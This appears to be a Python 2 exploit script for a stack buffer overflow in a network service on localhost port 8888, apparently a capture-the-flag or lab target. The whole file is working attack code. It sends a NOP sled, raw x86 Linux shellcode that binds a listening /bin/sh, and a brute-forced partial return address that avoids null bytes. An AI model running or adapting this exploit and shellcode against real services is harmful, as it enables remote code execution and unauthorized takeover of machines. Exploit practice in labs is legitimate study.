#!/usr/bin/env python2
#-*- coding:utf-8 -*-
import socket
import struct
server="localhost"
port=8888


def main(bottom):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    ret = s.recv(1<<16)
    print ret
    s.send("user\n")
    ret = s.recv(1<<16)
    print ret
    s.send("user\n")
    ret = s.recv(1<<16)
    print ret
    sc = '\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80'
    dat = "\x90"*(264-len(sc)) + sc + (bottom + "\xff\xff")*2 + "\x90"*4
    s.send(dat + "\n")


for i in xrange(5, 65535, 128):
    bottom = struct.pack("<H", i)
    if "\x00" in bottom:    #strcpy
        continue
    main(bottom)
    print repr(bottom)
